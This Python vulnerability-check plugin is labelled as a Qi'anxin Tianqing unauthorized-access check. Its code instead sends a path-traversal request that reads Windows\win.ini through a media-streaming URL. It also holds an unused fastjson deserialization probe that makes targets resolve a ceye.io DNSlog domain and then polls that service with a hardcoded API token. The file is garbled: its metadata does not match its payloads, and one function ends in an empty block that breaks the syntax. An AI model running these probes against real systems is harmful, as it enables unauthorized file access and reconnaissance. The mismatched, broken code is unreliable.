# coding:utf-8
import socket
import requests
import warnings
import time

warnings.filterwarnings('ignore')
vul_info = {
    "id":"10014",
    "name":"天擎越权漏洞",
    "detail":"终端安全管理系统(天擎)奇安信终端安全管理系统是面向政企单位推出的一体化终端安全产品解决方案。",
    "level":"高危",
    "type":"越权访问",
    "port":"8443",
    "solution":"",
    "reference":"http://bbs.qcloud.com/thread-30706-1-1.html",
    "author":"system",
    "expand":"default"
}
def vul_result(code,message):
    return '{"code":"%d","info":"%s"}' % (code,message)
def alive_detect(ip, port, timeout):
    ak = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ak.settimeout(timeout)
    try:
        ak.connect((ip,port))
        ak.close()
        return 'UP'
    except Exception as e:
        return 'DOWN'


def fastjson_check(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
    }
    data = '{"zeo":{"@type":"java.net.Inet4Address","val":"' + url + '.r7lgaj.ceye.io"}}'
    try:
        sends = requests.post(url=url, headers=headers, data=data, timeout=20)
    except:
        print(url + '访问失败，请重试或检查网络')

    time.sleep(3)
    try:
        check_dnslog = requests.get(
            url="http://api.ceye.io/v1/records?token=de291db2fa4d5f5442d39415dbca8841&type=dns&filter=",
            headers=headers)
    except:
        print('dnslogAPI调用失败，重新执行')
    if check_dnslog.text.find(url) >= 0:
        print('[+]' + url + ' is fastjson')
        with open('result.txt', 'a+') as f:
            f.write('[+]' + url + ' is fastjson\n')

        # print (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
    else:
        print('[-]' + url + ' not is fastjson')
        with open('result.txt', 'a+') as f:


def vul_detect(ip, port, timeout=5):
    if alive_detect(ip, int(port), timeout) == 'DOWN':
        return vul_result(2,'目标端口不可达')
    try:
        target = 'https://{}:{}/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/'.format(ip,port)
        r1 = requests.get(target,verify=False,timeout=timeout)
        if r1.status_code == 200:
            return vul_result(1,'存在')
        else:
            return vul_result(0,'不存在')
    except Exception as e:
        return vul_result(2,e)


